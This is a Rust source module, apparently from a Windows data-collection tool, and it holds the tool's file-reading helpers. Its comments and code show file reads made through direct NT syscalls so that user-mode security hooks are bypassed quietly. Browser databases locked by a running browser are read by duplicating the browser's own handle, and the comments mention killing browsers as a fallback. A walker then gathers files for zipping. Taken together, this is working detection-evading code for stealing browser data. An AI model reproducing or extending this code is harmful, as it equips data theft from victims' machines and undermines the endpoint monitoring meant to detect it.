//! File reading helpers. All collector file I/O funnels through here.
//! `read_file` issues direct NT syscalls (see syscall.rs) so user-mode
//! hooks on ntdll stubs are bypassed; if SSN resolution fails it falls
//! back to std::fs silently. `walk_files` stays on std::fs (enumeration
//! is not the hooked hot path).

use std::ffi::c_void;
use std::os::windows::ffi::OsStrExt;
use std::path::Path;
use std::time::Duration;

use crate::syscall::{
    self, FileStandardInformation, IoStatusBlock, Nt, NtStatus, ObjectAttributes, UnicodeString,
};

/// Sanity cap on a single read (also guards against absurd EndOfFile values).
const MAX_FILE: i64 = 512 * 1024 * 1024;

/// Read an entire file into memory.
///
/// Tiered, quietest-first:
///   1. Direct NT syscalls (bypasses user-mode hooks), brief retries on
///      sharing violations.
///   2. Handle duplication — read through the process that holds the file
///      open (browser DBs locked by a running browser).
///   3. std::fs fallback if SSN resolution failed.
/// Callers may still terminate browsers up-front as a last resort (procs.rs).
pub fn read_file(path: &Path) -> Option<Vec<u8>> {
    if let Some(nt) = syscall::nt() {
        if let Some(data) = unsafe { read_file_nt(nt, path) } {
            return Some(data);
        }
    }
    // NT path unavailable or failed at runtime: plain Win32/std still works
    // for anything not exclusively locked.
    if let Some(data) = read_file_std(path) {
        return Some(data);
    }
    // Quiet locked-file path: borrow the holder's own handle. Only worth a
    // full handle scan when the file exists but is locked.
    if !path.try_exists().unwrap_or(false) {
        return None;
    }
    crate::handlereader::read_via_handle_dup(path)
}

fn read_file_std(path: &Path) -> Option<Vec<u8>> {
    for attempt in 0..3 {
        match std::fs::read(path) {
            Ok(data) => return Some(data),
            Err(e) if e.raw_os_error() == Some(32) && attempt < 2 => {
                std::thread::sleep(Duration::from_millis(150));
            }
            Err(_) => return None,
        }
    }
    None
}

unsafe fn read_file_nt(nt: Nt, path: &Path) -> Option<Vec<u8>> {
    for attempt in 0..3 {
        match nt_read(&nt, path) {
            Ok(data) => return Some(data),
            Err(syscall::STATUS_SHARING_VIOLATION) if attempt < 2 => {
                std::thread::sleep(Duration::from_millis(150));
            }
            Err(_) => return None,
        }
    }
    None
}

/// Convert a DOS path to an NT path: `C:\x` -> `\??\C:\x`,
/// `\\?\C:\x` -> `\??\C:\x`, `\\srv\share` -> `\??\UNC\srv\share`.
/// The returned vector is NUL-terminated.
fn dos_to_nt(path: &Path) -> Result<Vec<u16>, NtStatus> {
    let w: Vec<u16> = path.as_os_str().encode_wide().collect();
    if w.is_empty() {
        return Err(syscall::STATUS_OBJECT_NAME_INVALID);
    }
    fn lit(s: &str) -> Vec<u16> {
        s.encode_utf16().collect()
    }
    let mut out = Vec::with_capacity(w.len() + 8);
    if w.starts_with(&lit(r"\\?\")) || w.starts_with(&lit(r"\\.\")) {
        out.extend_from_slice(&lit(r"\??\"));
        out.extend_from_slice(&w[4..]);
    } else if w.starts_with(&lit(r"\\")) {
        out.extend_from_slice(&lit(r"\??\UNC\"));
        out.extend_from_slice(&w[2..]);
    } else {
        out.extend_from_slice(&lit(r"\??\"));
        out.extend_from_slice(&w);
    }
    out.push(0);
    Ok(out)
}

unsafe fn nt_read(nt: &Nt, path: &Path) -> Result<Vec<u8>, NtStatus> {
    let wide = dos_to_nt(path)?;
    let name = UnicodeString::new(&wide[..wide.len() - 1]);
    let oa = ObjectAttributes::new(&name);
    let mut iosb = IoStatusBlock::default();
    let mut handle = 0usize;
    let status = nt.create_file(
        &mut handle,
        syscall::FILE_READ_DATA | syscall::FILE_READ_ATTRIBUTES | syscall::SYNCHRONOUS,
        &oa,
        &mut iosb,
        std::ptr::null(),
        0,
        syscall::FILE_SHARE_READ | syscall::FILE_SHARE_WRITE | syscall::FILE_SHARE_DELETE,
        syscall::FILE_OPEN,
        syscall::FILE_SYNCHRONOUS_IO_NONALERT | syscall::FILE_NON_DIRECTORY_FILE,
        std::ptr::null_mut(),
        0,
    );
    if status < 0 {
        return Err(status);
    }
    let result = nt_read_contents(nt, handle);
    nt.close(handle);
    result
}

unsafe fn nt_read_contents(nt: &Nt, handle: usize) -> Result<Vec<u8>, NtStatus> {
    let mut iosb = IoStatusBlock::default();
    let mut fsi = FileStandardInformation::default();
    let status = nt.query_information_file(
        handle,
        &mut iosb,
        &mut fsi as *mut _ as *mut c_void,
        std::mem::size_of::<FileStandardInformation>() as u32,
        syscall::FILE_STANDARD_INFORMATION,
    );
    if status < 0 {
        return Err(status);
    }
    let size = fsi.end_of_file;
    if size <= 0 {
        return Ok(Vec::new());
    }
    if size > MAX_FILE {
        return Err(syscall::STATUS_NO_MEMORY);
    }
    let mut buf: Vec<u8> = Vec::new();
    if buf.try_reserve(size as usize).is_err() {
        return Err(syscall::STATUS_NO_MEMORY);
    }
    buf.resize(size as usize, 0);

    let mut offset: i64 = 0;
    while offset < size {
        let chunk = (size - offset).min(0x7fff_ffff) as u32;
        let mut iosb = IoStatusBlock::default();
        let status = nt.read_file(
            handle,
            0,
            0,
            0,
            &mut iosb,
            buf.as_mut_ptr().add(offset as usize) as *mut c_void,
            chunk,
            &offset as *const i64,
            std::ptr::null(),
        );
        // The file may have shrunk between the size query and the read.
        if status == syscall::STATUS_END_OF_FILE {
            break;
        }
        if status < 0 {
            return Err(status);
        }
        if iosb.information == 0 {
            break;
        }
        offset += iosb.information as i64;
    }
    buf.truncate(offset as usize);
    Ok(buf)
}

/// Recursively list files under `root` (relative zip paths), capped per file.
pub fn walk_files(root: &Path, max_file: u64, out: &mut Vec<(std::path::PathBuf, u64)>) {
    let Ok(entries) = std::fs::read_dir(root) else {
        return;
    };
    for entry in entries.flatten() {
        let p = entry.path();
        let Ok(m) = entry.metadata() else {
            continue;
        };
        if m.is_dir() {
            walk_files(&p, max_file, out);
        } else if m.is_file() && m.len() > 0 && m.len() <= max_file {
            out.push((p, m.len()));
        }
    }
}
